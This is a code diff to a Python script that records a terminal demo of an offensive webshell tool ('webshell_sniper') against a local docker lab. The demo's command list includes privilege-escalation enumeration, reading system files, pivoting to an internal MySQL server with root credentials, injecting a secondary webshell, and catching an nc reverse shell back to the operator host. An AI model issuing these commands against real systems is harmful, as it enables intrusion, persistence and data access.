@@ -22,42 +22,45 @@ import time
 
 WIDTH, HEIGHT = 104, 32
 
-# (command, seconds to linger after Enter) — the highlight reel.
-# NB: addresses match the docker compose network (172.16.1.0/24): the internal
-# MySQL (.2:3306) and PostgreSQL (.3:5432) services, and the host gateway (.1)
-# that the target reverse-shells back to.
+# (command, seconds to linger after Enter) — Metasploit-flavoured highlight reel.
+# Two sessions are loaded from demo/webshells.json. NB: addresses match the docker
+# compose network (172.16.1.0/24) — the host gateway (.1) the target reverse-shells
+# back to, and the internal MySQL host `db`.
 CMDS = [
-    ("recon info", 2.0),                       # target summary
-    ("recon privesc", 2.4),                    # aggregate privesc enumeration
-    ("cd /var/www/html", 1.6),                 # prompt cwd updates (state-aware)
-    ("file ls", 1.8),                          # cwd-aware directory table
-    ("file read /etc/passwd", 2.0),            # read a remote file
-    ("file put /tmp/notes.txt /var/www/html/notes.txt", 2.0),  # upload
-    ("file get /var/www/html/notes.txt", 2.0), # download it back (round trip)
-    ("id", 1.6),                               # bare input -> REMOTE (www-data)
-    ("local", 1.2),                            # safety: prompt flips to LOCAL
-    ("whoami", 1.5),                           # runs on the operator box (ubuntu)
-    ("remote", 1.2),                           # back to REMOTE
-    ("pivot scan --hosts 172.16.1.0/29 --ports 3306,5432", 4.4),  # pivot: find internal DBs
-    ("pivot db --engine mysql --host db --user root --password root", 2.2),  # DB manager
-    ("databases", 1.8),                        #   nested DB sub-REPL: list schemas
-    ("quit", 1.2),                             #   leave the DB sub-REPL
-    ("inject web --password s3cr3t", 2.4),     # inject a secondary webshell
-    # --- real reverse shell: REPL spawns a local nc listener, target connects back ---
-    ("pivot shell -i 172.16.1.1 -p 4444 -m bash --listen --tool nc", 3.0),
-    ("id", 1.6),                               #   ...commands run in the caught shell
-    ("uname -a", 1.8),
-    ("exit", 1.6),                             #   close the shell -> back to the REPL
-    ("quit", 1.8),                             # snapshots the session
+    ("sessions", 2.0),                         # list loaded sessions (msf-style)
+    ("sysinfo", 2.0),                          # alias -> recon info
+    ("getuid", 1.6),                           # alias -> id (active session)
+    ("cd /var/www/html", 1.4),                 # state-aware prompt (cwd)
+    ("recon privesc", 2.2),                    # aggregate privesc enumeration
+    # --- datastore: set once, reused as defaults (no more prompts) ---
+    ("set LHOST 172.16.1.1", 0.7),
+    ("set LPORT 4444", 0.7),
+    ("set DB_ENGINE mysql", 0.7),
+    ("set DB_HOST db", 0.7),
+    ("set DB_USER root", 0.7),
+    ("set DB_PASS root", 0.7),
+    ("options", 2.0),                          # show the datastore
+    ("download /etc/hostname", 1.8),           # alias -> file get
+    ("pivot db", 2.2),                          # uses DB_* from the datastore, no prompt
+    ("databases", 1.6),                        #   nested DB sub-REPL
+    ("quit", 1.0),                             #   back to the main REPL
+    ("sessions -c id", 2.2),                   # broadcast a command to ALL sessions
+    # --- reverse shell using LHOST/LPORT from the datastore (no -i/-p needed) ---
+    ("pivot shell -m bash --listen --tool nc", 3.0),
+    ("id", 1.5),                               #   ...in the caught shell
+    ("uname -a", 1.7),
+    ("exit", 1.5),
+    ("sessions -i 1", 1.4),                    # switch the active session (prompt -> [1])
+    ("inject web --password s3cr3t", 2.2),     # inject a secondary webshell
+    ("quit", 1.8),                             # snapshot the session
 ]
 
-TYPE_DELAY = 0.045
+TYPE_DELAY = 0.05
 
 
 def main() -> None:
     out_path = sys.argv[1] if len(sys.argv) > 1 else "demo/sniper.cast"
-    argv = ["python", "-m", "webshell_sniper",
-            "http://127.0.0.1:8080/index.php", "POST", "c"]
+    argv = ["python", "-m", "webshell_sniper", "-f", "demo/webshells.json"]
     env = dict(os.environ, TERM="xterm-256color", COLUMNS=str(WIDTH), LINES=str(HEIGHT),
                COLORTERM="truecolor", FORCE_COLOR="1")
 
